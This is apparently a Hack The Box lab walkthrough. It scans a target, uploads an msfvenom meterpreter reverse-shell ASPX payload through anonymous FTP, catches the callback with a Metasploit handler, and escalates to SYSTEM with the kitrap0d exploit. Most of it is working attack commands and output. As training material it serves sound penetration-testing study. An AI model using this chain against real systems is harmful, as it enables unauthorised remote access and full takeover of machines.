## Creating Our Payloads
#### Scanning the Target

```shell
3kjS@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
```
#### FTP Anonymous Access

```shell
3kjS@htb[/htb]$ ftp 10.10.10.5
```
#### Generating Payload

```shell
3kjS@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

```shell
ftp > put reverse_shell.aspx 
local: reverse_shell.aspx remote: reverse_shell.aspx 
229 Entering Extended Passive Mode (|||47832|) 
150 Ok to send data. 100% |*********************| 2819 512.00 KiB/s 00:00 ETA 
226 Transfer complete. 2819 bytes sent in 00:00 (489.12 KiB/s)
```
#### MSF - Setting Up Multi/Handler

```shell
3kjS@htb[/htb]$ msfconsole -q 

msf6 > use multi/handler 

msf6 exploit(multi/handler) > show options

msf6 exploit(multi/handler) > set LHOST

msf6 exploit(multi/handler) > set LPORT

msf6 exploit(multi/handler) > run 

[*] Started reverse TCP handler on 10.10.14.5:1337
```

## Local Exploit Suggester
#### MSF - Searching for Local Exploit Suggester

```shell
msf6 > search local exploit suggester
```
#### MSF - Local Privilege Escalation

```shell
msf6 exploit(multi/handler) > search kitrap0d

msf6 exploit(windows/local/ms10_015_kitrap0d) > run

meterpreter > getuid 

Server username: NT AUTHORITY\SYSTEM
```
